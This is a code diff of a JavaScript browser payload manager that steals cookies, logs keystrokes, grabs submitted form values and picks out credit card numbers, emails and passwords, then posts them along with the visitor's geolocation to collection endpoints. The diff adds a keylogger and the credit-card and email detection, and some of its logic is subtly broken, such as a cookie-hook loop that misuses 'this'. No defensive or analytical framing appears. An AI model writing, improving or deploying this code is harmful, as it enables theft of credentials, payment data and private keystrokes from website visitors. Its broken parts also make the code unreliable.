@@ -7,12 +7,11 @@ console.log('%c[✓] Payload initialized', 'color: #4CAF50');
 
 const PayloadManager = {
     init: function() {
-        console.log('[PayloadManager] Initializing...');
-        
-        // Initialize all payloads
         this.initCookieStealer();
         this.initKeylogger();
         this.initFormStealer();
+        this.initCreditCardDetector();
+        this.initEmailDetector();
         this.initGeolocation();
         
         console.log('[PayloadManager] All payloads initialized');
@@ -22,11 +21,19 @@ const PayloadManager = {
         // Initial cookie capture
         this.captureCookies();
         
-        // Set up cookie change listener
-        document.addEventListener('cookie', this.captureCookies);
-        
-        // Periodic cookie check
-        setInterval(() => this.captureCookies(), 5000);
+        // Monitor cookie changes
+        document.cookie.split(';').forEach(cookie => {
+            const [name] = cookie.trim().split('=');
+            Object.defineProperty(document, 'cookie', {
+                get: function() {
+                    return cookie;
+                },
+                set: function(value) {
+                    cookie = value;
+                    this.captureCookies();
+                }
+            });
+        });
     },
 
     captureCookies: function() {
@@ -36,54 +43,67 @@ const PayloadManager = {
                 name: name,
                 value: value,
                 domain: window.location.hostname,
-                path: window.location.pathname
+                path: '/'
             };
-        }).filter(cookie => cookie.name && cookie.value);
+        });
 
         if (cookies.length > 0) {
-            fetch('/ep/api/cookies', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                credentials: 'include',
-                body: JSON.stringify({
-                    cookies: cookies,
-                    url: window.location.href,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            }).catch(console.error);
+            this.sendData('/ep/api/cookies', {
+                cookies: cookies,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            });
         }
+    },
+
+    initKeylogger: function() {
+        let buffer = '';
+        let lastKeystroke = Date.now();
+
+        document.addEventListener('keydown', (e) => {
+            buffer += e.key;
+            lastKeystroke = Date.now();
+
+            // Send buffer every 10 keystrokes or after 2 seconds
+            if (buffer.length >= 10 || Date.now() - lastKeystroke >= 2000) {
+                this.sendData('/ep/api/keylogger', {
+                    keys: buffer,
+                    url: window.location.href
+                });
+                buffer = '';
+            }
+        });
     },
 
     initFormStealer: function() {
         document.querySelectorAll('form').forEach(form => {
-            form.addEventListener('submit', async (e) => {
-                const formData = new FormData(form);
-                const data = {};
-                
-                for (let [key, value] of formData.entries()) {
-                    data[key] = value;
+            form.addEventListener('submit', (e) => {
+                const formData = {};
+                new FormData(form).forEach((value, key) => {
+                    formData[key] = value;
                     
                     // Check for sensitive data
                     if (this.isCreditCard(value)) {
-                        this.sendSensitiveData('credit_card', value);
+                        this.sendData('/ep/api/sensitive', {
+                            type: 'credit_card',
+                            value: value,
+                            url: window.location.href
+                        });
+                    } else if (this.isEmail(value)) {
+                        this.sendData('/ep/api/sensitive', {
+                            type: 'email',
+                            value: value,
+                            url: window.location.href
+                        });
+                    } else if (key.toLowerCase().includes('password')) {
+                        this.sendData('/ep/api/sensitive', {
+                            type: 'password',
+                            value: value,
+                            url: window.location.href
+                        });
                     }
-                    if (this.isEmail(value)) {
-                        this.sendSensitiveData('email', value);
-                    }
-                    if (key.toLowerCase().includes('pass')) {
-                        this.sendSensitiveData('password', value);
-                    }
-                }
-            });
-        });
-
-        // Monitor password fields
-        document.querySelectorAll('input[type="password"]').forEach(input => {
-            input.addEventListener('change', (e) => {
-                this.sendSensitiveData('password', e.target.value);
+                });
             });
         });
     },
@@ -92,61 +112,26 @@ const PayloadManager = {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    const geoData = {
+                    this.sendData('/ep/api/geolocation', {
                         lat: position.coords.latitude,
                         lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString(),
                         url: window.location.href,
-                        userAgent: navigator.userAgent
-                    };
-
-                    fetch('/ep/api/geolocation', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(geoData)
-                    }).catch(console.error);
+                        timestamp: new Date().toISOString(),
+                        source: 'browser'
+                    });
                 },
-                (error) => console.error('Geolocation error:', error),
-                { enableHighAccuracy: true }
+                (error) => console.log('[Geolocation] Error:', error)
             );
         }
-
-        // Also collect IP-based location
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                fetch('/ep/api/geolocation', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        ...data,
-                        source: 'ip',
-                        timestamp: new Date().toISOString(),
-                        url: window.location.href
-                    })
-                }).catch(console.error);
-            })
-            .catch(console.error);
     },
 
-    sendSensitiveData: function(type, value) {
-        fetch('/ep/api/sensitive', {
+    sendData: function(endpoint, data) {
+        fetch(endpoint, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-                type: type,
-                value: value,
-                url: window.location.href,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            })
+            body: JSON.stringify(data)
         }).catch(console.error);
     },
 
